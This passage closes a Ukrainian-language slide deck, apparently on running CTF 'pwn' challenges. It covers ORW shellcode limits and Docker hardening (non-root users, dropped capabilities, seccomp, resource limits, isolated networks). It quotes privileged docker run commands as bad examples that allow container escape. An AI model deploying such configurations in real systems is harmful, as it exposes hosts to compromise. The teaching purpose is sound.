- ORW використовує `open/read/write` (дозволені)

**Мережеві обмеження:**
- Shell потребує TTY
- ORW працює через будь-яке з'єднання

**Надійність**: Завжди працює якщо є базові syscalls

---

# Docker: Ризики

Небезпеки неправильного deployment

```yaml
# ❌ ПОГАНО
docker run --privileged pwn
docker run -v /:/host pwn
docker run --cap-add=ALL pwn
```

**Наслідки:**
- Container escape
- Host compromise
- DoS атаки

---

# Docker: Користувач

НЕ використовувати root

```yaml
services:
  pwn:
    user: "10001:10001"  # Не root!
    read_only: true      # Файлова система read-only
    tmpfs:
      - /tmp:rw,noexec,nosuid
```

---

# Docker: Capabilities

Drop ALL

```yaml
services:
  pwn:
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
```

**Мінімальні привілеї**: Тільки необхідні syscalls

---

# Docker: Resource Limits

Обмеження ресурсів

```yaml
services:
  pwn:
    mem_limit: 256m
    cpus: 0.5
    pids_limit: 128
    ulimits:
      nproc: 128
      nofile: 1024
```

**Захист**: Від DoS атак

---

# Docker: Seccomp

Фільтрація системних викликів

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [{
    "names": ["read", "write", "exit"],
    "action": "SCMP_ACT_ALLOW"
  }]
}
```

**Застосування**: `seccomp=./seccomp.json`

---

# Docker: Seccomp для ORW

Дозволити open/read/write

```json
{
  "syscalls": [{
    "names": [
      "read", "write", "open", "openat",
      "close", "exit", "exit_group"
    ],
    "action": "SCMP_ACT_ALLOW"
  }]
}
```

---

# Docker: Мережева ізоляція

Internal network

```yaml
networks:
  pwn_internal:
    driver: bridge
    internal: true  # Без Інтернету!
```

**Захист**: Контейнер не може підключитись назовні

---

# Висновки: PWN

Ключові принципи

- 🎯 **Прогресія**: nc → checksec → BOF → ROP → ret2libc
- 🐍 **Автоматизація**: pwntools критично важливий
- 🔒 **Docker**: Правильна ізоляція обов'язкова
- 📊 **Методологія**: Показувати C код + Python exploit
- 🛡️ **Безпека**: Drop caps, read-only FS, seccomp, limits

---
layout: center
class: text-center
---

# Дякую за увагу!